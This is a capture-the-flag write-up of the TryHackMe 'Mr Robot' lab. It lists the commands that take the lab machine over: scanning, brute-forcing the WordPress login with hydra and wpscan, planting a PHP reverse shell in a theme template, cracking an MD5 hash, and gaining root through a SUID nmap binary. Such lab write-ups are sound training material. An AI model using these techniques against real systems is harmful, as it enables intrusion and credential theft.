## Mr Robot CTF [THM]

![image](images/258005482-57cfddb9-c046-4f14-90f1-e4225d1fe13f.png)


Link: https://tryhackme.com/room/mrrobot

Goal: 3 keys

## nmap
```
nmap -sC -sV 10.10.44.210            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 04:55 EDT
Nmap scan report for 10.10.44.210
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.46 seconds
```
- Port 22 close
- Port 80 open
- Port 443 open

## view web [port 80]

![image](images/257760405-cf42b083-2891-4517-88cb-18ac79e35e23.png)

## dirsearch
```
dirsearch -u 10.10.44.210             
                                                                               
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Target: http://10.10.44.210/

[05:22:22] Starting: 
[05:23:35] 200 -    1KB - /admin/                                           
[05:23:35] 200 -    1KB - /admin/?/login             
[05:23:37] 200 -    1KB - /admin/index                                      
[05:23:37] 200 -    1KB - /admin/index.html                                 
[05:24:53] 200 -    0B  - /favicon.ico                                              
[05:25:07] 200 -    1KB - /index.html                                                                                  
[05:25:14] 200 -  504KB - /intro                                            
[05:25:16] 200 -  309B  - /license                                          
[05:25:16] 200 -  309B  - /license.txt
[05:25:55] 200 -   64B  - /readme                                           
[05:25:55] 200 -   64B  - /readme.html                                      
[05:25:58] 200 -   41B  - /robots.txt                                                  
[05:26:08] 200 -    0B  - /sitemap                                          
[05:26:08] 200 -    0B  - /sitemap.xml.gz                                   
[05:26:08] 200 -    0B  - /sitemap.xml
[05:26:35] 200 -    1B  - /wp-admin/admin-ajax.php                   
[05:26:35] 200 -    0B  - /wp-config.php
[05:26:35] 200 -    0B  - /wp-content/                                                         
[05:26:35] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php                  
[05:26:36] 200 -    0B  - /wp-cron.php
[05:26:36] 200 -    3KB - /wp-login
[05:26:36] 200 -    3KB - /wp-login.php                                     
[05:26:36] 200 -    3KB - /wp-login/                                        

Task Completed
```
- /robots.txt
- /wp-login

## robots.txt

![image](images/257761197-c2a5b7b6-fc4c-4c46-b7d9-55dc34cc3ab4.png)

- fsocity.dic
- key-1-of-3.txt

## key 1

![image](images/257761795-ebc8f0cc-d162-4bfc-b0bb-2f3353c27aec.png)

## download fsociety.dic

![image](images/257763233-d40f3f58-7dc7-4171-bd82-db75b4ca66f4.png)

- to sort and filter duplicate
```
sort fsocity.dic | uniq > filter.txt
```

## wp-login

![image](images/257769941-f7433ee8-b9d5-452c-a2f6-4b039608c1c1.png)

## hydra [bruteforce username]
```
hydra -L filter.txt -p admin 10.10.191.118 http-post-form "/wp-login.php:log=^USER^&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.191.118%2Fwp-admin%2F&testcookie=1:Invalid username" -V

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.10.191.118:80/wp-login.php:log=^USER^&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.191.118%2Fwp-admin%2F&testcookie=1:Invalid username
[ATTEMPT] target 10.10.191.118 - login "000" - pass "admin" - 1 of 11452 [child 0] (0/0)
[80][http-post-form] host: 10.10.191.118   login: elliot   password: admin
[80][http-post-form] host: 10.10.191.118   login: Elliot   password: admin
[80][http-post-form] host: 10.10.191.118   login: ELLIOT   password: admin
[ATTEMPT] target 10.10.191.118 - login "Embedded" - pass "admin" - 5489 of 11452 [child 12] (0/0)
```
- found username: elliot, Elliot, ELLIOT

## wpscan [bruteforce password]
- using username from hydra
```
wpscan --url http://10.10.245.248/wp-login -U Elliot -P filter.txt    

Interesting Finding(s):

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                                                             
Trying Elliot / erased Time: 00:08:34 <==============                                > (5630 / 17081) 32.96%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652
```
- found Username: Elliot, Password: ER28-0652

## successfully login

![image](images/257867577-57d938ad-5b04-4a35-926e-5075a7da1656.png)

## setup php reverse shell
- goto editor => edit 404 template => replace with php reverse shell => update file

![image](images/257870081-cc9fb496-64c0-4fc0-bf64-335f3d1182e9.png)

## setup netcat listener
- goto `http://10.10.191.118/wordpress/wp-content/themes/twentyfifteen/404.php` dont forget to open listener `nc -lnvp 1337` on terminal

![image](images/257871519-b6020c84-067a-4f2b-8734-9bb82d14b0bf.png)

- `python3 -c 'import pty;pty.spawn("/bin/bash")'` upgrade shell
- `export TERM=xterm` enable clear

## cd /home/robot
- `cat password.raw-md5` `robot:c3fcd3d76192e4007dfb496cca67e13b`
- `cat key-2-of-3.txt` `Permission denied`

![image](images/257877739-bb3fb870-6da9-4d78-b614-31155ac89681.png)


## crack md5 hash
```
john --format=Raw-MD5 --wordlist=/home/kali/Desktop/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)     
1g 0:00:00:00 DONE (2023-08-02 12:12) 5.263g/s 213221p/s 213221c/s 213221C/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

- found password: abcdefghijklmnopqrstuvwxyz

## switch user to robot

![image](images/257878256-ce39eb3b-2a3d-4efa-b7b3-9ec1ec630974.png)

## key 2

![image](images/257878716-8ded0f0d-6d7d-46dc-ade5-c1fe5d1a92fc.png)

## privilege escalation
- using SUID Commands `find / -user root -perm /4000 2>/dev/null`

![image](images/257879984-74d1126b-baf4-4607-86d9-d01986e855c3.png)

- Search GTFObins for [nmap](https://gtfobins.github.io/gtfobins/nmap/) because it looks sus here.

![image](images/257884196-45e99a78-295b-4192-9b94-9c33460b5800.png)

- root!

## key 3

![image](images/257884617-b26a09eb-3d7f-4402-a63f-1bf3bf9b0089.png)

- PWNED! :star:
